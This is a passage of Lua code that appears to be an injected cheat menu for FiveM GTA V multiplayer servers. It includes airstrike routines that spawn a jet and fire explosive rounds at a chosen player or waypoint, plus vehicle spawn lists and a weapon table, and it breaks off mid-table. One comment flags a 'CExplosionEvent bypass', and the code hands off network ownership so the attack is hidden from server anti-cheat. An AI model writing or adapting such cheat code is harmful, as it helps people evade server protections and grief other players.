            RemoveBlip(blip)

            notify("Airstrike on player is complete!")
            break
          end
          Wait(0)
        end

        isAirstrikeRunning = false
      end
      CreateThreadNow(AirstrikeThread)
    end

    local function AirstrikeWaypoint()
      if isAirstrikeRunning then
        notify("Wait until the current airstrike is complete")
      end

      local WaypointHandle = GetFirstBlipInfoId(8)

      if not DoesBlipExist(WaypointHandle) then
        return notify("You must place a waypoint")
      end

      local function AirstrikeThread()
        isAirstrikeRunning = true

        local target = GetBlipInfoIdCoord(WaypointHandle)
        local origin = target + vector3(Airstrike.spawnDistance, Airstrike.spawnDistance, 725.0)
        repeat
          Wait(0)
        until HasModelLoaded(Airstrike.ped_hash) and HasModelLoaded(Airstrike.vehicle_hash)

        repeat
          Wait(0)
        until HasWeaponAssetLoaded(Airstrike.weapon_asset)

        -- Create Aircraft
        local aircraft = CreateVehicle(Airstrike.vehicle_hash, origin, 0.0, true, true)
        FreezeEntityPosition(aircraft, true)
        -- Create pilot and block temporary events
        local pilot = CreatePedInsideVehicle(aircraft, 29, Airstrike.ped_hash, -1, true, true)
        SetBlockingOfNonTemporaryEvents(pilot, true)
        SetDriverAbility(pilot, 1.0)
        -- Make sure the vehicle engine is started
        SetVehicleEngineOn(aircraft, true, true, true)

        -- Retract landing gear for fast flight
        ControlLandingGear(aircraft, 3)

        -- Disable turbulence
        SetPlaneTurbulenceMultiplier(aircraft, 0.0)

        -- Make sure the vehicle is marked as unowned by Player
        SetVehicleHasBeenOwnedByPlayer(aircraft, false)

        SetVehicleForceAfterburner(aircraft, true)
        local blip = AddBlipForEntity(aircraft)

        -- Disabled rockets (CExplosionEvent bypass)
        SetCurrentPedVehicleWeapon(pilot, Airstrike.weapon_asset)

        SetVehicleWeaponsDisabled(aircraft, 2)
        FreezeEntityPosition(aircraft, false)
        TaskVehicleDriveToCoord(pilot, aircraft, target.x, target.y, target.z, 3500.0 * 2.6, 1.0, Airstrike.vehicle_hash, 16777216, 1.0, true)

        SetDriveTaskCruiseSpeed(pilot, 150.0)

        -- Register with network and give up network ownership
        NetworkRegisterEntityAsNetworked(aircraft)
        local netVehid = NetworkGetNetworkIdFromEntity(aircraft)
        NetworkSetNetworkIdDynamic(netVehid, false)
        SetNetworkIdCanMigrate(netVehid, true)
        NetworkSetChoiceMigrateOptions(true, player)
        SetNetworkIdExistsOnAllMachines(netVehid, true)

        aircraft = NetToVeh(netVehid)

        -- Give up network ownership of ped
        NetworkRegisterEntityAsNetworked(pilot)
        local netPedid = NetworkGetNetworkIdFromEntity(pilot)
        NetworkSetNetworkIdDynamic(netPedid, false)
        SetNetworkIdCanMigrate(netPedid, true)
        NetworkSetChoiceMigrateOptions(true, player)
        SetNetworkIdExistsOnAllMachines(netPedid, true)

        pilot = NetToPed(netPedid)

        while true do
          local vehCoords = GetEntityCoords(aircraft)
          local distance = GetDistanceBetweenCoords(vehCoords, target)

          if not DoesEntityExist(aircraft) then
            isAirstrikeRunning = false
            return notify("The pilot sux and crashed the jet")
          end

          if distance <= 150.0 then
            ShootSingleBulletBetweenCoords(vehCoords.x, vehCoords.y, vehCoords.z - 2.0, target.x, target.y, target.z, 10000.0, 0, Airstrike.weapon_asset, pilot, true, false, 8000.0)
            for i = 1, 11 do
              local offset = target + vector3(math.random(-8.0, 8.0), math.random(-8.0, 8.0), 0.0)
              local vehCoords = GetEntityCoords(aircraft)
              -- print(offset)
              ShootSingleBulletBetweenCoords(vehCoords.x, vehCoords.y, vehCoords.z - 2.0, offset.x, offset.y, offset.z, 10000.0, 0, Airstrike.weapon_asset, pilot, true, false, 8000.0)

              Wait(100)
            end

            TaskVehicleDriveToCoord(pilot, aircraft, origin, 3500.0 * 2.6, 1.0, Airstrike.vehicle_hash, 16777216, 1.0, true)
            Wait(10000)
            DeletePed(pilot)

            SetEntityAsMissionEntity(aircraft)
            DeleteVehicle(aircraft)

            RemoveBlip(blip)

            notify("Airstrike on waypoint is complete!")
            break
          end
          Wait(0)
        end

        isAirstrikeRunning = false
      end
      CreateThreadNow(AirstrikeThread)
    end


    function DrawText3D(x, y, z, text, r, g, b)
      SetDrawOrigin(x, y, z, 0)
      SetTextFont(0)
      SetTextProportional(0)
      SetTextScale(0.0, 0.20)
      SetTextColour(r, g, b, 255)
      SetTextDropshadow(0, 0, 0, 0, 255)
      SetTextEdge(2, 0, 0, 0, 150)
      SetTextDropShadow()
      SetTextOutline()
      SetTextEntry("STRING")
      SetTextCentre(1)
      AddTextComponentString(text)
      DrawText(0.0, 0.0)
      ClearDrawOrigin()
    end

    function math.round(num, numDecimalPlaces)
      return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", num))
    end

    local function RGB(frequency)
      local result = {}
      local curtime = GetGameTimer() / 1000

      result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
      result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
      result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

      return result
    end

    function notify(text)
      SetNotificationTextEntry("STRING")
      AddTextComponentString(text)
      DrawNotification(true, false)
    end

    function checkValidVehicleExtras()
      local playerPed = PlayerPedId()
      local playerVeh = GetVehiclePedIsIn(playerPed, false)
      local valid = {}

      for i=0,50,1 do
        if(DoesExtraExist(playerVeh, i))then
          local realModname = "Extra #"..tostring(i)
          local text = "OFF"
          if(IsVehicleExtraTurnedOn(playerVeh, i))then
            text = "ON"
          end
          local realSpawnname = "extra "..tostring(i)
          table.insert(valid, {
            menuName=realModName,
            data ={
              ["action"] = realSpawnName,
              ["state"] = text
            }
          })
        end
      end

      return valid
    end


    function DoesVehicleHaveExtras( veh )
      for i = 1, 30 do
        if ( DoesExtraExist( veh, i ) ) then
          return true
        end
      end

      return false
    end


    function checkValidVehicleMods(modID)
      local playerPed = PlayerPedId()
      local playerVeh = GetVehiclePedIsIn(playerPed, false)
      local valid = {}
      local modCount = GetNumVehicleMods(playerVeh,modID)
      if (modID == 48 and modCount == 0) then


        local modCount = GetVehicleLiveryCount(playerVeh)
        for i=1, modCount, 1 do
          local realIndex = i - 1
          local modName = GetLiveryName(playerVeh, realIndex)
          local realModName = GetLabelText(modName)
          local modid, realSpawnName = modID, realIndex

          valid[i] = {
            menuName=realModName,
            data = {
              ["modid"] = modid,
              ["realIndex"] = realSpawnName
            }
          }
        end
      end

      for i = 1, modCount, 1 do
        local realIndex = i - 1
        local modName = GetModTextLabel(playerVeh, modID, realIndex)
        local realModName = GetLabelText(modName)
        local modid, realSpawnName = modCount, realIndex


        valid[i] = {
          menuName=realModName,
          data = {
            ["modid"] = modid,
            ["realIndex"] = realSpawnName
          }
        }
      end


      if(modCount > 0)then
        local realIndex = -1
        local modid, realSpawnName = modID, realIndex
        table.insert(valid, 1, {
          menuName="Stock",
          data = {
            ["modid"] = modid,
            ["realIndex"] = realSpawnName
          }
        })
      end

      return valid
    end

    EVP.OpenMenu(EnVyPIcS)

    local boats = {"Dinghy", "Dinghy2", "Dinghy3", "Dingh4", "Jetmax", "Marquis", "Seashark", "Seashark2", "Seashark3", "Speeder", "Speeder2", "Squalo", "Submersible", "Submersible2", "Suntrap", "Toro", "Toro2", "Tropic", "Tropic2", "Tug"}
    local Commercial = {"Benson", "Biff", "Cerberus", "Cerberus2", "Cerberus3", "Hauler", "Hauler2", "Mule", "Mule2", "Mule3", "Mule4", "Packer", "Phantom", "Phantom2", "Phantom3", "Pounder", "Pounder2", "Stockade", "Stockade3", "Terbyte"}
    local Compacts = {"Blista", "Blista2", "Blista3", "Brioso", "Dilettante", "Dilettante2", "Issi2", "Issi3", "issi4", "Iss5", "issi6", "Panto", "Prarire", "Rhapsody"}
    local Coupes = { "CogCabrio", "Exemplar", "F620", "Felon", "Felon2", "Jackal", "Oracle", "Oracle2", "Sentinel", "Sentinel2", "Windsor", "Windsor2", "Zion", "Zion2"}
    local cycles = { "Bmx", "Cruiser", "Fixter", "Scorcher", "Tribike", "Tribike2", "tribike3" }
    local Emergency = { "Ambulance", "FBI", "FBI2", "FireTruk", "PBus", "Police", "Police2", "Police3", "Police4", "PoliceOld1", "PoliceOld2", "PoliceT", "Policeb", "Polmav", "Pranger", "Predator", "Riot", "Riot2", "Sheriff", "Sheriff2"}
    local Helicopters = { "Akula", "Annihilator", "Buzzard", "Buzzard2", "Cargobob", "Cargobob2", "Cargobob3", "Cargobob4", "Frogger", "Frogger2", "Havok", "Hunter", "Maverick", "Savage", "Seasparrow", "Skylift", "Supervolito", "Supervolito2", "Swift", "Swift2", "Valkyrie", "Valkyrie2", "Volatus"}
    local Industrial = { "Bulldozer", "Cutter", "Dump", "Flatbed", "Guardian", "Handler", "Mixer", "Mixer2", "Rubble", "Tiptruck", "Tiptruck2"}
    local Military = { "APC", "Barracks", "Barracks2", "Barracks3", "Barrage", "Chernobog", "Crusader", "Halftrack", "Khanjali", "Rhino", "Scarab", "Scarab2", "Scarab3", "Thruster", "Trailersmall2"}
    local Motorcycles = { "Akuma", "Avarus", "Bagger", "Bati2", "Bati", "BF400", "Blazer4", "CarbonRS", "Chimera", "Cliffhanger", "Daemon", "Daemon2", "Defiler", "Deathbike", "Deathbike2", "Deathbike3", "Diablous", "Diablous2", "Double", "Enduro", "esskey", "Faggio2", "Faggio3", "Faggio", "Fcr2", "fcr", "gargoyle", "hakuchou2", "hakuchou", "hexer", "innovation", "Lectro", "Manchez", "Nemesis", "Nightblade", "Oppressor", "Oppressor2", "PCJ", "Ratbike", "Ruffian", "Sanchez2", "Sanchez", "Sanctus", "Shotaro", "Sovereign", "Thrust", "Vader", "Vindicator", "Vortex", "Wolfsbane", "zombiea", "zombieb"}
    local muscle = { "Blade", "Buccaneer", "Buccaneer2", "Chino", "Chino2", "clique", "Deviant", "Dominator", "Dominator2", "Dominator3", "Dominator4", "Dominator5", "Dominator6", "Dukes", "Dukes2", "Ellie", "Faction", "faction2", "faction3", "Gauntlet", "Gauntlet2", "Hermes", "Hotknife", "Hustler", "Impaler", "Impaler2", "Impaler3", "Impaler4", "Imperator", "Imperator2", "Imperator3", "Lurcher", "Moonbeam", "Moonbeam2", "Nightshade", "Phoenix", "Picador", "RatLoader", "RatLoader2", "Ruiner", "Ruiner2", "Ruiner3", "SabreGT", "SabreGT2", "Sadler2", "Slamvan", "Slamvan2", "Slamvan3", "Slamvan4", "Slamvan5", "Slamvan6", "Stalion", "Stalion2", "Tampa", "Tampa3", "Tulip", "Vamos,", "Vigero", "Virgo", "Virgo2", "Virgo3", "Voodoo", "Voodoo2", "Yosemite"}
    local OffRoad = {"BFinjection", "Bifta", "Blazer", "Blazer2", "Blazer3", "Blazer5", "Bohdi", "Brawler", "Bruiser", "Bruiser2", "Bruiser3", "Caracara", "DLoader", "Dune", "Dune2", "Dune3", "Dune4", "Dune5", "Insurgent", "Insurgent2", "Insurgent3", "Kalahari", "Kamacho", "LGuard", "Marshall", "Mesa", "Mesa2", "Mesa3", "Monster", "Monster4", "Monster5", "Nightshark", "RancherXL", "RancherXL2", "Rebel", "Rebel2", "RCBandito", "Riata", "Sandking", "Sandking2", "Technical", "Technical2", "Technical3", "TrophyTruck", "TrophyTruck2", "Freecrawler", "Menacer"}
    local Planes = {"AlphaZ1", "Avenger", "Avenger2", "Besra", "Blimp", "blimp2", "Blimp3", "Bombushka", "Cargoplane", "Cuban800", "Dodo", "Duster", "Howard", "Hydra", "Jet", "Lazer", "Luxor", "Luxor2", "Mammatus", "Microlight", "Miljet", "Mogul", "Molotok", "Nimbus", "Nokota", "Pyro", "Rogue", "Seabreeze", "Shamal", "Starling", "Stunt", "Titan", "Tula", "Velum", "Velum2", "Vestra", "Volatol", "Striekforce"}
    local SUVs = {"BJXL", "Baller", "Baller2", "Baller3", "Baller4", "Baller5", "Baller6", "Cavalcade", "Cavalcade2", "Dubsta", "Dubsta2", "Dubsta3", "FQ2", "Granger", "Gresley", "Habanero", "Huntley", "Landstalker", "patriot", "Patriot2", "Radi", "Rocoto", "Seminole", "Serrano", "Toros", "XLS", "XLS2"}
    local Sedans = {"Asea", "Asea2", "Asterope", "Cog55", "Cogg552", "Cognoscenti", "Cognoscenti2", "emperor", "emperor2", "emperor3", "Fugitive", "Glendale", "ingot", "intruder", "limo2", "premier", "primo", "primo2", "regina", "romero", "stafford", "Stanier", "stratum", "stretch", "surge", "tailgater", "warrener", "Washington"}
    local Service = { "Airbus", "Brickade", "Bus", "Coach", "Rallytruck", "Rentalbus", "Taxi", "Tourbus", "Trash", "Trash2", "WastIndr", "PBus2"}
    local Sports = {"Alpha", "Banshee", "Banshee2", "BestiaGTS", "Buffalo", "Buffalo2", "Buffalo3", "Carbonizzare", "Comet2", "Comet3", "Comet4", "Comet5", "Coquette", "Deveste", "Elegy", "Elegy2", "Feltzer2", "Feltzer3", "FlashGT", "Furoregt", "Fusilade", "Futo", "GB200", "Hotring", "Infernus2", "Italigto", "Jester", "Jester2", "Khamelion", "Kurama", "Kurama2", "Lynx", "MAssacro", "MAssacro2", "neon", "Ninef", "ninfe2", "omnis", "Pariah", "Penumbra", "Raiden", "RapidGT", "RapidGT2", "Raptor", "Revolter", "Ruston", "Schafter2", "Schafter3", "Schafter4", "Schafter5", "Schafter6", "Schlagen", "Schwarzer", "Sentinel3", "Seven70", "Specter", "Specter2", "Streiter", "Sultan", "Surano", "Tampa2", "Tropos", "Verlierer2", "ZR380", "ZR3802", "ZR3803"}
    local SportsClassic = {"Ardent", "BType", "BType2", "BType3", "Casco", "Cheetah2", "Cheburek", "Coquette2", "Coquette3", "Deluxo", "Fagaloa", "Gt500", "JB700", "JEster3", "MAmba", "Manana", "Michelli", "Monroe", "Peyote", "Pigalle", "RapidGT3", "Retinue", "Savastra", "Stinger", "Stingergt", "Stromberg", "Swinger", "Torero", "Tornado", "Tornado2", "Tornado3", "Tornado4", "Tornado5", "Tornado6", "Viseris", "Z190", "ZType"}
    local Super = {"Adder", "Autarch", "Bullet", "Cheetah", "Cyclone", "EntityXF", "Entity2", "FMJ", "GP1", "Infernus", "LE7B", "Nero", "Nero2", "Osiris", "Penetrator", "PFister811", "Prototipo", "Reaper", "SC1", "Scramjet", "Sheava", "SultanRS", "Superd", "T20", "Taipan", "Tempesta", "Tezeract", "Turismo2", "Turismor", "Tyrant", "Tyrus", "Vacca", "Vagner", "Vigilante", "Visione", "Voltic", "Voltic2", "Zentorno", "Italigtb", "Italigtb2", "XA21"}
    local Trailer = { "ArmyTanker", "ArmyTrailer", "ArmyTrailer2", "BaleTrailer", "BoatTrailer", "CableCar", "DockTrailer", "Graintrailer", "Proptrailer", "Raketailer", "TR2", "TR3", "TR4", "TRFlat", "TVTrailer", "Tanker", "Tanker2", "Trailerlogs", "Trailersmall", "Trailers", "Trailers2", "Trailers3"}
    local trains = {"Freight", "Freightcar", "Freightcont1", "Freightcont2", "Freightgrain", "Freighttrailer", "TankerCar"}
    local Utility = {"Airtug", "Caddy", "Caddy2", "Caddy3", "Docktug", "Forklift", "Mower", "Ripley", "Sadler", "Scrap", "TowTruck", "Towtruck2", "Tractor", "Tractor2", "Tractor3", "TrailerLArge2", "Utilitruck", "Utilitruck3", "Utilitruck2"}
    local Vans = {"Bison", "Bison2", "Bison3", "BobcatXL", "Boxville", "Boxville2", "Boxville3", "Boxville4", "Boxville5", "Burrito", "Burrito2", "Burrito3", "Burrito4", "Burrito5", "Camper", "GBurrito", "GBurrito2", "Journey", "Minivan", "Minivan2", "Paradise", "pony", "Pony2", "Rumpo", "Rumpo2", "Rumpo3", "Speedo", "Speedo2", "Speedo4", "Surfer", "Surfer2", "Taco", "Youga", "youga2"}
    local CarTypes = {"Boats", "Commercial", "Compacts", "Coupes", "Cycles", "Emergency", "Helictopers", "Industrial", "Military", "Motorcycles", "Muscle", "Off-Road", "Planes", "SUVs", "Sedans", "Service", "Sports", "Sports Classic", "Super", "Trailer", "Trains", "Utility", "Vans"}
    local CarsArray = { boats, Commercial, Compacts, Coupes, cycles, Emergency, Helicopters, Industrial, Military, Motorcycles, muscle, OffRoad, Planes, SUVs, Sedans, Service, Sports, SportsClassic, Super, Trailer, trains, Utility, Vans}
    local Trailers = { "ArmyTanker", "ArmyTrailer", "ArmyTrailer2", "BaleTrailer", "BoatTrailer", "CableCar", "DockTrailer", "Graintrailer", "Proptrailer", "Raketailer", "TR2", "TR3", "TR4", "TRFlat", "TVTrailer", "Tanker", "Tanker2", "Trailerlogs", "Trailersmall", "Trailers", "Trailers2", "Trailers3"}
    local allWeapons = {"WEAPON_KNIFE","WEAPON_KNUCKLE","WEAPON_NIGHTSTICK","WEAPON_HAMMER","WEAPON_BAT","WEAPON_GOLFCLUB","WEAPON_CROWBAR","WEAPON_BOTTLE","WEAPON_DAGGER","WEAPON_HATCHET","WEAPON_MACHETE","WEAPON_FLASHLIGHT","WEAPON_SWITCHBLADE","WEAPON_POOLCUE","WEAPON_PIPEWRENCH","WEAPON_PISTOL","WEAPON_PISTOL_MK2","WEAPON_COMBATPISTOL","WEAPON_APPISTOL","WEAPON_PISTOL50","WEAPON_SNSPISTOL","WEAPON_HEAVYPISTOL","WEAPON_VINTAGEPISTOL","WEAPON_STUNGUN","WEAPON_FLAREGUN","WEAPON_MARKSMANPISTOL","WEAPON_REVOLVER","WEAPON_MICROSMG","WEAPON_SMG","WEAPON_SMG_MK2","WEAPON_ASSAULTSMG","WEAPON_MG","WEAPON_COMBATMG","WEAPON_COMBATMG_MK2","WEAPON_COMBATPDW","WEAPON_GUSENBERG","WEAPON_MACHINEPISTOL","WEAPON_ASSAULTRIFLE","WEAPON_ASSAULTRIFLE_MK2","WEAPON_CARBINERIFLE","WEAPON_CARBINERIFLE_MK2","WEAPON_ADVANCEDRIFLE","WEAPON_SPECIALCARBINE","WEAPON_BULLPUPRIFLE","WEAPON_COMPACTRIFLE","WEAPON_PUMPSHOTGUN","WEAPON_SAWNOFFSHOTGUN","WEAPON_BULLPUPSHOTGUN","WEAPON_ASSAULTSHOTGUN","WEAPON_MUSKET","WEAPON_HEAVYSHOTGUN","WEAPON_DBSHOTGUN","WEAPON_SNIPERRIFLE","WEAPON_HEAVYSNIPER","WEAPON_HEAVYSNIPER_MK2","WEAPON_MARKSMANRIFLE","WEAPON_GRENADELAUNCHER","WEAPON_GRENADELAUNCHER_SMOKE","WEAPON_RPG","WEAPON_STINGER","WEAPON_FIREWORK","WEAPON_HOMINGLAUNCHER","WEAPON_GRENADE","WEAPON_STICKYBOMB","WEAPON_PROXMINE","WEAPON_BZGAS","WEAPON_SMOKEGRENADE","WEAPON_MOLOTOV","WEAPON_FIREEXTINGUISHER","WEAPON_PETROLCAN","WEAPON_SNOWBALL","WEAPON_FLARE","WEAPON_BALL"}
    local l_weapons={Melee={BaseballBat={id="weapon_bat",name="~r~> ~s~Baseball Bat",bInfAmmo=false,mods={}},BrokenBottle={id="weapon_bottle",name="~r~> ~s~Broken Bottle",bInfAmmo=false,mods={}},Crowbar={id="weapon_Crowbar",name="~r~> ~s~Crowbar",bInfAmmo=false,mods={}},Flashlight={id="weapon_flashlight",name="~r~> ~s~Flashlight",bInfAmmo=false,mods={}},GolfClub={id="weapon_golfclub",name="~r~> ~s~Golf Club",bInfAmmo=false,mods={}},BrassKnuckles={id="weapon_knuckle",name="~r~> ~s~Brass Knuckles",bInfAmmo=false,mods={}},Knife={id="weapon_knife",name="~r~> ~s~Knife",bInfAmmo=false,mods={}},Machete={id="weapon_machete",name="~r~> ~s~Machete",bInfAmmo=false,mods={}},Switchblade={id="weapon_switchblade",name="~r~> ~s~Switchblade",bInfAmmo=false,mods={}},Nightstick={id="weapon_nightstick",name="~r~> ~s~Nightstick",bInfAmmo=false,mods={}},BattleAxe={id="weapon_battleaxe",name="~r~> ~s~Battle Axe",bInfAmmo=false,mods={}}, PoolCue={id="weapon_poolcue",name="~r~> ~s~Poolcue",bInfAmmo=false,mods={}}, PipeWrench={id="weapon_pipewrench",name="~r~> ~s~PipeWrench",bInfAmmo=false,mods={}}}, Handguns={Pistol={id="weapon_pistol",name="~r~> ~g~Pistol",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_PISTOL_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_PISTOL_CLIP_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP_02"}}}},PistolMK2={id="weapon_pistol_mk2",name="~r~> ~s~Pistol MK 2",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_PISTOL_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_PISTOL_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_PISTOL_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_PISTOL_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_PISTOL_MK2_CLIP_HOLLOWPOINT"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_PISTOL_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Mounted Scope",id="COMPONENT_AT_PI_RAIL"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH_02"}},BarrelAttachments={{name="~r~> ~s~Compensator",id="COMPONENT_AT_PI_COMP"},{name="~r~> ~s~Suppessor",id="COMPONENT_AT_PI_SUPP_02"}}}},CombatPistol={id="weapon_combatpistol",name="~r~> ~s~Combat Pistol",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_COMBATPISTOL_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_COMBATPISTOL_CLIP_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP"}}}},APPistol={id="weapon_appistol",name="~r~> ~s~AP Pistol",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_APPISTOL_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_APPISTOL_CLIP_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP"}}}},StunGun={id="weapon_stungun",name="~r~> ~s~Stun Gun",bInfAmmo=false,mods={}},Pistol50={id="weapon_pistol50",name="~r~> ~s~Pistol .50",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_PISTOL50_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_PISTOL50_CLIP_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP_02"}}}},SNSPistol={id="weapon_snspistol",name="~r~> ~s~SNS Pistol",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_SNSPISTOL_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_SNSPISTOL_CLIP_02"}}}},SNSPistolMkII={id="weapon_snspistol_mk2",name="~r~> ~s~SNS Pistol Mk II",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_SNSPISTOL_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_SNSPISTOL_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_SNSPISTOL_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_SNSPISTOL_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_SNSPISTOL_MK2_CLIP_HOLLOWPOINT"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_SNSPISTOL_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Mounted Scope",id="COMPONENT_AT_PI_RAIL_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH_03"}},BarrelAttachments={{name="~r~> ~s~Compensator",id="COMPONENT_AT_PI_COMP_02"},{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP_02"}}}},HeavyPistol={id="weapon_heavypistol",name="~r~> ~s~Heavy Pistol",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_HEAVYPISTOL_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_HEAVYPISTOL_CLIP_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP"}}}},VintagePistol={id="weapon_vintagepistol",name="~r~> ~s~Vintage Pistol",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_VINTAGEPISTOL_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_VINTAGEPISTOL_CLIP_02"}},BarrelAttachments={{"Suppressor",id="COMPONENT_AT_PI_SUPP"}}}},FlareGun={id="weapon_flaregun",name="~r~> ~s~Flare Gun",bInfAmmo=false,mods={}},MarksmanPistol={id="weapon_marksmanpistol",name="~r~> ~s~Marksman Pistol",bInfAmmo=false,mods={}},HeavyRevolver={id="weapon_revolver",name="~r~> ~s~Heavy Revolver",bInfAmmo=false,mods={}},HeavyRevolverMkII={id="weapon_revolver_mk2",name="~r~> ~s~Heavy Revolver Mk II",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Rounds",id="COMPONENT_REVOLVER_MK2_CLIP_01"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_REVOLVER_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_REVOLVER_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_REVOLVER_MK2_CLIP_HOLLOWPOINT"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_REVOLVER_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS"},{name="~r~> ~s~Small Scope",id="COMPONENT_AT_SCOPE_MACRO_MK2"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH"}},BarrelAttachments={{name="~r~> ~s~Compensator",id="COMPONENT_AT_PI_COMP_03"}}}},DoubleActionRevolver={id="weapon_doubleaction",name="~r~> ~s~Double Action Revolver",bInfAmmo=false,mods={}},UpnAtomizer={id="weapon_raypistol",name="~r~> ~s~Up-n-Atomizer",bInfAmmo=false,mods={}}},SMG={MicroSMG={id="weapon_microsmg",name="~r~> ~s~Micro SMG",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_MICROSMG_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_MICROSMG_CLIP_02"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_MACRO"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"}}}},SMG={id="weapon_smg",name="~r~> ~s~SMG",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_SMG_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_SMG_CLIP_02"},{name="~r~> ~s~Drum Magazine",id="COMPONENT_SMG_CLIP_03"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_MACRO_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP"}}}},SMGMkII={id="weapon_smg_mk2",name="~r~> ~s~SMG Mk II",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_SMG_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_SMG_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_SMG_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_SMG_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_SMG_MK2_CLIP_HOLLOWPOINT"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_SMG_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS_SMG"},{name="~r~> ~s~Small Scope",id="COMPONENT_AT_SCOPE_MACRO_02_SMG_MK2"},{name="~r~> ~s~Medium Scope",id="COMPONENT_AT_SCOPE_SMALL_SMG_MK2"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},Barrel={{name="~r~> ~s~Default",id="COMPONENT_AT_SB_BARREL_01"},{name="~r~> ~s~Heavy",id="COMPONENT_AT_SB_BARREL_02"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP"},{name="~r~> ~s~Flat Muzzle Brake",id="COMPONENT_AT_MUZZLE_01"},{name="~r~> ~s~Tactical Muzzle Brake",id="COMPONENT_AT_MUZZLE_02"},{name="~r~> ~s~Fat-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_03"},{name="~r~> ~s~Precision Muzzle Brake",id="COMPONENT_AT_MUZZLE_04"},{name="~r~> ~s~Heavy Duty Muzzle 